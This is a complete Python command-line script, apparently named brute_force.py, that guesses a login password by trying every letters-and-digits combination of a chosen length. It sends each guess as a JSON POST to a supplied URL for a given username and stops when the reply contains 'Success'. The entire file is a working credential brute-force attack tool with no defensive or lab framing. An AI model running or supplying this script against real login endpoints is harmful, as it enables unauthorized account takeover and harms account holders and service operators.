import requests
import sys
import string
import itertools

def brute_force(url, username, password_length):
    # Generate possible passwords from letters and digits
    charset = string.ascii_letters + string.digits
    for attempt in itertools.product(charset, repeat=password_length):
        password = ''.join(attempt)
        data = {
            "username": username,
            "password": password
        }
        try:
            # Send POST request to the server
            response = requests.post(url, json=data)
            print(f"Trying: {password} - Status Code: {response.status_code}")
            if "Success" in response.text:
                print(f"Success! The password is: {password}")
                break
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            break

if __name__ == "__main__":
    # Check if correct number of arguments is passed
    if len(sys.argv) != 4:
        print("Usage: python3 brute_force.py <url> <username> <passwordLength>")
        sys.exit(1)

    url = sys.argv[1]  # URL for sending requests
    username = sys.argv[2]  # Username for login attempt
    try:
        password_length = int(sys.argv[3])  # Length of the password to brute-force
    except ValueError:
        print("Password length must be an integer.")
        sys.exit(1)

    # Call the brute force function
    brute_force(url, username, password_length)
